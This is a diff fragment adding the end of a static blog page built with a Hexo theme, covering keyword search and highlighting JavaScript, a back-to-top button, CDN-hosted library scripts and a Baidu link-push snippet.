+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/materialize/materialize.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/aos/aos.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
